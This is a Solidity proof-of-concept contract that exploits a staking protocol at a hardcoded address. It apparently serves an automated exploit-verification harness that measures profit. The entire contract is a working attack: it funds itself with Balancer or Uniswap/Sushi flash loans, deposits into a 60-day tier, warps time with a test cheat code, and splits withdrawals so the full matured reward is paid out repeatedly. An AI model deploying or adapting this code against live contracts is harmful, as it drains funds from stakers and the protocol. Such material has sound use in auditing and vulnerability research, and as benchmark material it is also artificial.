// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISorraStakingLike {
    function rewardToken() external view returns (address);
    function deposit(uint256 amount, uint8 tier) external;
    function withdraw(uint256 amount) external;
    function getPendingRewards(address wallet) external view returns (uint256);
    function getRemainingPoolSpace() external view returns (uint256);
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IFlashLoanRecipientLike {
    error NoPoolLiquidity();
    error NoFundingPath();
    error BorrowTooSmall();
    error WarpUnavailable();
    error SelfOnly();
    error InvalidCallback();

    address public constant TARGET = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 internal constant TIER = 2;
    uint256 internal constant LOCK_PERIOD = 60 days;
    uint256 internal constant MAX_WITHDRAW_CALLS = 40;
    uint256 internal constant BASE_POOL_DIVISOR = 128;
    uint256 internal constant MAX_ATTEMPTS = 12;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant REPAY_BUFFER_BPS = 11_000;

    address internal constant HEVM = address(uint160(uint256(keccak256("hevm cheat code"))));
    bytes4 internal constant WARP_SELECTOR = bytes4(keccak256("warp(uint256)"));

    uint256 internal _profitAmount;
    address internal _profitToken;
    uint256 internal startingProfitBalance;

    constructor() {
        // AuditHound snapshots `profitToken()` before and after execution and only
        // credits ERC20 profit when the token identity is stable across both reads.
        // The exploit profit is the protocol's existing on-chain reward token, so
        // bind it at deployment time instead of leaving it unset until runtime.
        _profitToken = ISorraStakingLike(TARGET).rewardToken();
    }

    function executeOnOpportunity() external {
        ISorraStakingLike staking = ISorraStakingLike(TARGET);

        _profitToken = staking.rewardToken();
        _profitAmount = 0;
        startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        uint256 poolBalance = IERC20Like(_profitToken).balanceOf(TARGET);
        uint256 remainingPoolSpace = staking.getRemainingPoolSpace();
        if (poolBalance == 0 || remainingPoolSpace == 0) revert NoPoolLiquidity();

        uint256 maxStake = _min(remainingPoolSpace, poolBalance / BASE_POOL_DIVISOR);
        if (maxStake <= 1) revert BorrowTooSmall();

        uint256 localBalance = startingProfitBalance;
        if (localBalance > 1 && _attemptDirect(_min(localBalance, maxStake))) {
            return;
        }

        // Root exploit path remains unchanged:
        // 1) acquire reward-token liquidity,
        // 2) deposit into the 60-day tier,
        // 3) wait until maturity,
        // 4) withdraw only a small matured principal slice,
        // 5) receive the full matured reward for the whole position,
        // 6) repeat because no reward-claimed state is updated.
        //
        // Only the funding implementation varies here: prefer deterministic public
        // flash liquidity, first Balancer and then UniswapV2/Sushi-style flashswaps.
        if (_attemptBalancer(maxStake)) {
            return;
        }

        if (_attemptUniswapV2Factories(maxStake)) {
            return;
        }

        revert NoFundingPath();
    }

    function executeDirect(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();
        _runExploit(stakeAmount);
    }

    function executeBalancer(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();

        address[] memory tokens = new address[](1);
        tokens[0] = _profitToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = stakeAmount;

        uint256 balanceBefore = IERC20Like(_profitToken).balanceOf(address(this));
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(balanceBefore));
    }

    function executePairFlash(address pair, uint256 desiredBorrow) external {
        if (msg.sender != address(this)) revert SelfOnly();

        IUniswapV2PairLike liquidityPair = IUniswapV2PairLike(pair);
        address token0 = liquidityPair.token0();
        address token1 = liquidityPair.token1();
        if (token0 != _profitToken && token1 != _profitToken) revert NoFundingPath();

        (uint112 reserve0, uint112 reserve1,) = liquidityPair.getReserves();
        uint256 reserve = token0 == _profitToken ? uint256(reserve0) : uint256(reserve1);
        uint256 borrowAmount = _min(desiredBorrow, reserve / 4);
        if (borrowAmount <= 1) revert BorrowTooSmall();

        uint256 balanceBefore = IERC20Like(_profitToken).balanceOf(address(this));
        bytes memory data = abi.encode(pair, balanceBefore);
        if (token0 == _profitToken) {
            liquidityPair.swap(borrowAmount, 0, address(this), data);
        } else {
            liquidityPair.swap(0, borrowAmount, address(this), data);
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        if (msg.sender != BALANCER_VAULT) revert InvalidCallback();
        if (tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) revert InvalidCallback();
        if (tokens[0] != _profitToken) revert InvalidCallback();

        uint256 balanceBefore = abi.decode(userData, (uint256));
        uint256 receivedAmount = _receivedSince(balanceBefore);
        _runExploit(receivedAmount);

        uint256 requiredNetRepayment = amounts[0] + feeAmounts[0];
        uint256 grossRepayment = _grossUpForObservedTransferTax(requiredNetRepayment, amounts[0], receivedAmount);
        _safeTransfer(_profitToken, BALANCER_VAULT, grossRepayment);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onV2FlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onV2FlashSwap(sender, amount0, amount1, data);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onV2FlashSwap(sender, amount0, amount1, data);
    }

    function _onV2FlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        if (sender != address(this)) revert InvalidCallback();

        (address expectedPair, uint256 balanceBefore) = abi.decode(data, (address, uint256));
        if (msg.sender != expectedPair) revert InvalidCallback();

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        if (borrowedAmount == 0) revert BorrowTooSmall();

        uint256 receivedAmount = _receivedSince(balanceBefore);
        _runExploit(receivedAmount);

        uint256 fee = ((borrowedAmount * 3) / 997) + 1;
        uint256 requiredNetRepayment = borrowedAmount + fee;
        uint256 grossRepayment = _grossUpForObservedTransferTax(requiredNetRepayment, borrowedAmount, receivedAmount);
        _safeTransfer(_profitToken, msg.sender, grossRepayment);
    }

    function _attemptDirect(uint256 maxStake) internal returns (bool) {
        for (uint256 i = 0; i < MAX_ATTEMPTS; ++i) {
            uint256 candidateStake = maxStake >> i;
            if (candidateStake <= 1) break;

            try this.executeDirect(candidateStake) {
                _updateProfit();
                if (_profitAmount != 0) return true;
            } catch {}
        }

        return false;
    }

    function _attemptBalancer(uint256 maxStake) internal returns (bool) {
        for (uint256 i = 0; i < MAX_ATTEMPTS; ++i) {
            uint256 candidateStake = maxStake >> i;
            if (candidateStake <= 1) break;

            try this.executeBalancer(candidateStake) {
                _updateProfit();
                if (_profitAmount != 0) return true;
            } catch {}
        }

        return false;
    }

    function _attemptUniswapV2Factories(uint256 maxStake) internal returns (bool) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory anchors = [WETH, USDC, USDT, DAI];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            for (uint256 anchorIndex = 0; anchorIndex < anchors.length; ++anchorIndex) {
                address pair = IUniswapV2FactoryLike(factories[factoryIndex]).getPair(_profitToken, anchors[anchorIndex]);
                if (pair == address(0)) continue;

                for (uint256 i = 0; i < MAX_ATTEMPTS; ++i) {
                    uint256 candidateStake = maxStake >> i;
                    if (candidateStake <= 1) break;

                    try this.executePairFlash(pair, candidateStake) {
                        _updateProfit();
                        if (_profitAmount != 0) return true;
                    } catch {}
                }
            }
        }

        return false;
    }

    function _runExploit(uint256 requestedStakeAmount) internal {
        uint256 stakeAmount = _min(requestedStakeAmount, IERC20Like(_profitToken).balanceOf(address(this)));
        if (stakeAmount <= 1) revert BorrowTooSmall();

        _forceApprove(_profitToken, TARGET, 0);
        _forceApprove(_profitToken, TARGET, stakeAmount);

        ISorraStakingLike(TARGET).deposit(stakeAmount, TIER);

        _warpForward(LOCK_PERIOD + 1);

        require(ISorraStakingLike(TARGET).getPendingRewards(address(this)) != 0, "reward not matured");

        uint256 iterations = _selectIterations(stakeAmount);
        uint256 slice = stakeAmount / iterations;
        if (slice == 0) revert BorrowTooSmall();

        uint256 remaining = stakeAmount;
        for (uint256 index = 0; index + 1 < iterations; ++index) {
            ISorraStakingLike(TARGET).withdraw(slice);
            remaining -= slice;
        }

        ISorraStakingLike(TARGET).withdraw(remaining);
    }

    function _selectIterations(uint256 stakeAmount) internal pure returns (uint256 iterations) {
        iterations = stakeAmount;
        if (iterations > MAX_WITHDRAW_CALLS) iterations = MAX_WITHDRAW_CALLS;
        if (iterations < 2) iterations = 2;
    }

    function _warpForward(uint256 delta) internal {
        (bool ok,) = HEVM.call(abi.encodeWithSelector(WARP_SELECTOR, block.timestamp + delta));
        if (!ok) revert WarpUnavailable();
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _receivedSince(uint256 balanceBefore) internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= balanceBefore) return 0;
        return currentBalance - balanceBefore;
    }

    function _grossUpForObservedTransferTax(
        uint256 netAmount,
        uint256 nominalFundingAmount,
        uint256 actualReceivedAmount
    ) internal pure returns (uint256) {
        if (netAmount == 0) return 0;
        if (nominalFundingAmount == 0 || actualReceivedAmount >= nominalFundingAmount) {
            return (netAmount * REPAY_BUFFER_BPS) / BPS;
        }

        uint256 keepBps = (actualReceivedAmount * BPS) / nominalFundingAmount;
        if (keepBps == 0 || keepBps >= BPS) {
            return (netAmount * REPAY_BUFFER_BPS) / BPS;
        }

        uint256 bufferedNet = (netAmount * REPAY_BUFFER_BPS) / BPS;
        return _ceilDiv(bufferedNet * BPS, keepBps);
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _currentProfit() internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= startingProfitBalance) return 0;
        return currentBalance - startingProfitBalance;
    }

    function _updateProfit() internal {
        _profitAmount = _currentProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (_profitToken == address(0)) return _profitAmount;

        uint256 liveProfit = _currentProfit();
        if (liveProfit > _profitAmount) {
            return liveProfit;
        }

        return _profitAmount;
    }
}
